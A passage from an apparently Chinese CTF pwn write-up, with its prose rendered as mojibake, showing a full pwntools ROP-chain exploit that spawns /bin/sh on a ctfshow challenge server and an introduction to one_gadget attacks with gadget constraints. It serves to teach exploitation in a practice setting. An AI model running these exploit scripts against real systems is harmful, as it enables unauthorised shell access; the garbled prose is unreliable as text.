</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0806cc25</span><span class="p">)</span> <span class="c1"># int 0x80</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28192</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x18</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0806f02a</span><span class="p">)</span> <span class="c1"># pop edx ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080ea060</span><span class="p">)</span> <span class="c1"># @ .data</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080b81c6</span><span class="p">)</span> <span class="c1"># pop eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="s1">&#39;/bin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080549db</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0806f02a</span><span class="p">)</span> <span class="c1"># pop edx ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080ea064</span><span class="p">)</span> <span class="c1"># @ .data + 4</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080b81c6</span><span class="p">)</span> <span class="c1"># pop eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="s1">&#39;//sh&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080549db</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0806f02a</span><span class="p">)</span> <span class="c1"># pop edx ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080ea068</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x08049303</span><span class="p">)</span> <span class="c1"># xor eax, eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080549db</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080481c9</span><span class="p">)</span> <span class="c1"># pop ebx ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080ea060</span><span class="p">)</span> <span class="c1"># @ .data</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080de955</span><span class="p">)</span> <span class="c1"># pop ecx ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080ea068</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0806f02a</span><span class="p">)</span> <span class="c1"># pop edx ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080ea068</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x08049303</span><span class="p">)</span> <span class="c1"># xor eax, eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a86f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0806cc25</span><span class="p">)</span> <span class="c1"># int 0x80</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°ï¼Œå®ƒå·²ç»å¾ˆæ™ºèƒ½çš„å¸®æˆ‘ä»¬æ„é€ å¥½äº†è¿™äº›ï¼Œæˆ‘ä»¬ä»…ä»…éœ€è¦å°†å®ƒæ„é€ å¥½çš„payloadæå–å‡ºæ¥ï¼Œç„¶åå¡«å……ä¸Šåç§»å³å¯è¿›è¡Œæˆ‘ä»¬çš„æ”»å‡»ã€‚</p>
<p>è¿™ä¸ªæ¯”è¾ƒç±»ä¼¼æ‚é¡¹çš„ä¸€æŠŠæ¢­çš„æ„Ÿè§‰ï¼Œåœ¨è¿™ä¸ªé˜¶æ®µä¸è¦æˆ‘ä»¬å­¦ä¼šï¼Œå½“ç„¶ç°åœ¨çš„æˆ‘ä¹Ÿä¸ä¼šï¼Œä»¥åå°±ä¼šäº†ã€‚</p>
<blockquote class="alert alert-note">
    <blockquote>
<p>ä½¿ç”¨å‰æï¼šç¨‹åºä¸º â€œé™æ€ç¼–è¯‘â€ ä¸”æ— ç°æˆçš„ <code>system</code>/<code>execve</code> å‡½æ•°ã€å…³é—­ PIE ä¸”å¼€å¯ NXï¼ˆæ ˆä¸å¯æ‰§è¡Œï¼‰ã€å­˜åœ¨ â€œå¯æ§æ ˆæº¢å‡ºâ€ ä¸”æº¢å‡ºç©ºé—´è¶³å¤Ÿã€‚</p>
<p>ä½¿ç”¨è¯¥æŒ‡ä»¤çš„æ ¸å¿ƒåŸå› æ˜¯ç¨‹åºä¸º <strong>é™æ€ç¼–è¯‘</strong>ï¼Œ<code>file pwn</code> æ˜¾ç¤º <code>statically linked</code>ï¼Œä¸”æœªç›´æ¥æä¾› <code>system</code>ã€<code>execve</code> ç­‰å¯ç›´æ¥ getshell çš„å‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/258.png"
	width="1840"
	height="81"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/258_hu_c3bef381c605e654.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/258_hu_7af9f22cc3ac88ae.png 1024w"
	loading="lazy"
	
		alt="é™æ€ç¼–è¯‘"
	
	
		class="gallery-image" 
		data-flex-grow="2271"
		data-flex-basis="5451px"
	
></p>
<ul>
<li>é™æ€ç¼–è¯‘çš„ç¨‹åºä¼šå°†æ‰€æœ‰ä¾èµ–çš„åº“å‡½æ•°ï¼ˆå¦‚ <code>read</code>ã€<code>write</code>ã€<code>int 0x80</code> ç³»ç»Ÿè°ƒç”¨å…¥å£ï¼‰æ‰“åŒ…åˆ°è‡ªèº«ä¸­ï¼Œä¸å­˜åœ¨ â€œåŠ¨æ€é“¾æ¥ä¾èµ– libcâ€ çš„é—®é¢˜ï¼Œ<code>ROPgadget</code> èƒ½ä»ç¨‹åºè‡ªèº«æå–åˆ°å®Œæ•´çš„ ROP ç»„ä»¶ï¼ˆå¦‚ <code>pop edx; ret</code>ã€<code>mov [edx], eax; ret</code>ã€<code>int 0x80</code> ç­‰ï¼‰ï¼Œè¶³ä»¥æ„é€ å‡ºè°ƒç”¨ <code>execve(&quot;/bin/sh&quot;)</code> çš„å®Œæ•´ ROP é“¾ï¼›</li>
<li>è‹¥ç¨‹åºä¸º<strong>åŠ¨æ€ç¼–è¯‘</strong>ï¼ˆä¾èµ–å¤–éƒ¨ libcï¼‰ï¼Œä¸”æœªæ³„éœ² libc åŸºå€ï¼Œ<code>ROPgadget</code> æ— æ³•è·å– libc å†…éƒ¨çš„ gadgetï¼ˆå¦‚ <code>system</code> åœ°å€ã€<code>/bin/sh</code> å­—ç¬¦ä¸²åœ°å€ï¼‰ï¼Œè‡ªåŠ¨ç”Ÿæˆçš„ ROP é“¾ä¼šå›  â€œç¼ºå°‘å…³é”®ç»„ä»¶â€ å¤±æ•ˆï¼Œæ— æ³•ç›´æ¥ä½¿ç”¨ â€œä¸€æŠŠæ¢­â€ã€‚</li>
</ul>
</blockquote></blockquote>
<h3 id="one_"><strong>one_gadgetæ”»å‡»</strong>
</h3><h3 id="pwn_074">PWN_074
</h3><p>é¢˜ç›®ï¼šå™¢ï¼Ÿå¥½åƒåˆ°ç°åœ¨ä¸ºæ­¢è¿˜æ²¡æœ‰äº†è§£åˆ°one_gadget?</p>
<p>checksecï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/260.png"
	width="811"
	height="201"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/260_hu_d9ce22458a2b640e.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/260_hu_696ecee99d8fc59e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="403"
		data-flex-basis="968px"
	
></p>
<p>64ä½ä¿æŠ¤å…¨å¼€&hellip;.æˆ‘éƒ½æ‡µäº†ã€‚</p>
<p>ç›¸å¯¹äºç°é˜¶æ®µï¼Œçœ‹åˆ°è¿™ç§ä¿æŠ¤å…¨å¼€çš„é¢˜å¯èƒ½ä¼šæœ‰ç‚¹è¿·èŒ«ï¼Œä½†æ˜¯å®é™…ä¸Šåœ¨å †é˜¶æ®µåé¢åŸºæœ¬ä¸Šéƒ½æ˜¯ä¿æŠ¤å…¨å¼€çš„é¢˜æ¯”è¾ƒå¤šä¸€ç‚¹ï¼Œè¿™é‡Œä¹Ÿæ˜¯ä¸ºäº†è®©å¤§å®¶æå‰äº†è§£ä¸€äº›æ”»å‡»æ‰‹æ³•ã€‚</p>
<p>IDA64åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/261.png"
	width="1070"
	height="506"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/261_hu_fb268501c613659a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/261_hu_626707aef074ad69.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="211"
		data-flex-basis="507px"
	
></p>
<p>å¼€å±€ç›´æ¥æ³„éœ²äº†pringtfçš„åœ°å€æˆ‘ä»¬ï¼Œä½†å› ä¸ºåœ°å€åŠ¨æ€å˜åŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ³„éœ²libcåº“åœ°å€ï¼Œç®—å‡ºè¿™ä¸ªç¨‹åºçš„å‡½æ•°åç§»é‡ã€‚</p>
<p>é€šè¿‡ __isoc99_scanf å‡½æ•°ä»ç”¨æˆ·è¾“å…¥ä¸­è¯»å–ä¸€ä¸ªé•¿æ•´æ•°ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ v4 æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸­ã€‚</p>
<p>å†å°† v4 æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼èµ‹ç»™äº†æ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´ ã€‚ç»§ç»­é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨äº† v4 æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ‰€æŒ‡å‘çš„å‡½æ•°ã€‚è¿™ä¸ªéƒ¨åˆ†åˆ©ç”¨å‡½æ•°æŒ‡é’ˆçš„ç‰¹æ€§ï¼Œå°†å…¶è½¬æ¢ä¸ºå‡½æ•°å¹¶è¿›è¡Œè°ƒç”¨ã€‚</p>
<blockquote class="alert alert-warn">
    <blockquote>
<p>ä½¿ç”¨ç”¨æˆ·è¾“å…¥æ¥è·å–å‡½æ•°æŒ‡é’ˆï¼Œå¹¶é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨ç›¸åº”çš„å‡½æ•°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§é€šè¿‡ç”¨æˆ·è¾“å…¥æ¥è·å–å‡½æ•°æŒ‡é’ˆå¹¶è°ƒç”¨å‡½æ•°çš„åšæ³•ææœ‰å¯èƒ½ä¼šå¸¦æ¥å®‰å…¨éšæ‚£ï¼Œå› ä¸ºæ¶æ„ç”¨æˆ·å¯ä»¥è¾“å…¥ä¸å®‰å…¨çš„å‡½æ•°æŒ‡é’ˆï¼Œå¯¼è‡´ç¨‹åºå‡ºç°é—®é¢˜ã€‚</p>
</blockquote></blockquote>
<p>åˆ°è¿™é‡Œå¼•å‡ºä¸‹ä¸€ä¸ªæ”»å‡»æ‰‹æ®µâ€”â€”one gadget</p>
<p>one_gadgetæ˜¯libcä¸­å­˜åœ¨çš„ä¸€äº›æ‰§è¡Œexecve(&quot;/bin/sh&quot;, NULL, NULL)çš„ç‰‡æ®µï¼Œå½“å¯ä»¥æ³„éœ²libcåœ°å€ï¼Œå¹¶ä¸”å¯ä»¥çŸ¥é“libcç‰ˆæœ¬çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•æ¥å¿«é€Ÿæ§åˆ¶æŒ‡ä»¤å¯„å­˜å™¨å¼€å¯shellã€‚</p>
<p>ç›¸æ¯”äºsystem(&quot;/bin/sh&quot;)ï¼Œè¿™ç§æ–¹å¼æ›´åŠ æ–¹ä¾¿ï¼Œä¸ç”¨æ§åˆ¶RDIã€RSIã€RDXç­‰å‚æ•°ã€‚è¿ç”¨äºä¸åˆ©æ„é€ å‚æ•°çš„æƒ…å†µã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">one_gadget /lib/x86_64-linux-gnu/libc.so.6
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/262.png"
	width="899"
	height="375"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/262_hu_88cc34031fb4af00.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/262_hu_4a5d6ba47111a871.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="239"
		data-flex-basis="575px"
	
></p>
<p>one_gadgetå¹¶ä¸æ€»æ˜¯å¯ä»¥è·å–shellï¼Œå®ƒé¦–å…ˆè¦æ»¡è¶³ä¸€äº›æ¡ä»¶æ‰èƒ½æ‰§è¡ŒæˆåŠŸ,åé¢æç¤ºå°±æ˜¯åœ¨è°ƒç”¨one_gadgetå‰éœ€è¦æ»¡è¶³çš„æ¡ä»¶ã€‚</p>
<blockquote>
<p><strong>çº¦æŸæ¡ä»¶æ»¡è¶³</strong>ï¼šone - gadget æ˜¯ libc ä¸­æ‰§è¡Œ<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>çš„ä»£ç ç‰‡æ®µï¼Œä½†éœ€è¦æ»¡è¶³ç‰¹å®šçº¦æŸæ¡ä»¶æ‰èƒ½æ‰§è¡ŒæˆåŠŸã€‚<code>0x4f2c5</code>çš„çº¦æŸæ¡ä»¶ä¸º<code>rsp &amp; 0xf == 0</code>ä¸”<code>rcx == NULL</code> ï¼Œ<code>0x4f322</code>çš„çº¦æŸæ¡ä»¶ä¸º<code>[rsp + 0x40] == NULL</code> ï¼Œ<code>0x10a2fc</code>çš„çº¦æŸæ¡ä»¶ä¸º<code>[rsp + 0x70] == NULL</code>ã€‚åœ¨ PWN074 åœºæ™¯ä¸­ï¼Œç¨‹åºæ ˆå¸ƒå±€ä½¿å¾—<code>[rsp + 0x70]</code>å¤©ç„¶ä¸º NULLï¼ˆå› ä¸ºè¯¥åœ°å€è¶…å‡ºå½“å‰å‡½æ•°æ ˆå¸§èŒƒå›´ï¼Œå±äºæœªä½¿ç”¨çš„ç©ºé—²æ ˆåŒºåŸŸï¼Œåœ¨ Linux ç³»ç»Ÿä¸­é»˜è®¤å¡«å……ä¸º 0ï¼‰ ï¼Œæ»¡è¶³<code>0x10a2fc</code>çš„çº¦æŸæ¡ä»¶ï¼Œè€Œå…¶ä»–ä¸¤ä¸ªåœ°å€çš„çº¦æŸæ¡ä»¶éš¾ä»¥æ»¡è¶³ã€‚ä¾‹å¦‚ï¼Œ<code>rsp &amp; 0xf == 0</code>è¦æ±‚æ ˆæŒ‡é’ˆä½ 4 ä½ä¸º 0ï¼Œåœ¨ç¨‹åºæœªæä¾›è°ƒæ•´æ ˆæŒ‡é’ˆå¯¹é½çš„å¯æ§é€”å¾„æ—¶ï¼Œå¾ˆéš¾å®ç°ï¼›åŒæ—¶ç¨‹åºæœªå¯¹<code>rcx</code>å¯„å­˜å™¨è¿›è¡Œæ§åˆ¶ï¼Œ<code>rcx</code>å¤§æ¦‚ç‡ä¸ä¸º NULLï¼Œä¸æ»¡è¶³<code>0x4f2c5</code>çš„æ¡ä»¶ï¼›<code>[rsp + 0x40]</code>åœ¨ç¨‹åºè¿è¡Œæ—¶å­˜å‚¨æœ‰ä¸´æ—¶æ•°æ®ï¼Œæ— æ³•é€šè¿‡ç”¨æˆ·è¾“å…¥æ¸…ç©ºï¼Œä¸æ»¡è¶³<code>0x4f322</code>çš„æ¡ä»¶ã€‚</p>
</blockquote>
<blockquote class="alert alert-warn">
    <blockquote>
<p>æœ¬é¢˜ä»…ä»…æ˜¯ä¸€ä¸ªå·¥å…·å¼•è¿›ä½¿ç”¨ï¼Œå…·ä½“å¯ä»¥è‡ªè¡Œè°ƒè¯•ä¸€ä¸‹ä¾¿çŸ¥ã€‚çœäº†å¾ˆå¤§ä¸€éƒ¨åˆ†æ—¶é—´å’Œç²¾åŠ›ï¼Œå¯¹äºåˆå­¦è€…æ¥è¯´ï¼Œ<strong>libcç‰ˆæœ¬æ˜¯ä¸ªå‘</strong>ã€‚å› æ­¤åœ¨è®­ç»ƒé¢˜å‹ä¸Šå¹³å°ä¸€èˆ¬å¼„äº†å‡ ä¸ªæ¯”è¾ƒç›¸å¯¹å›ºå®šçš„libcç‰ˆæœ¬ï¼Œ<strong>å®é™…æ¯”èµ›æ—¶libcçš„ç‰ˆæœ¬æ›´åŠ å¤šæ ·å¤æ‚</strong>ã€‚</p>
<p>å½“ç„¶ï¼Œåœ¨è¿™é‡Œå¦‚æœä¸æ˜¯ä½¿ç”¨çš„é™„å¸¦è™šæ‹Ÿæœºï¼Œåˆ™éœ€è¦è‡ªè¡Œå»æ³„æ¼libcï¼Œå½“ç„¶å‰é¢ç»è¿‡è¿™ä¹ˆå¤šé¢˜çš„ç»ƒä¹ ï¼Œç›¸ä¿¡è¿™äº›ä¹Ÿæ˜¯æ²¡éš¾åº¦äº†ã€‚</p>
</blockquote></blockquote>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
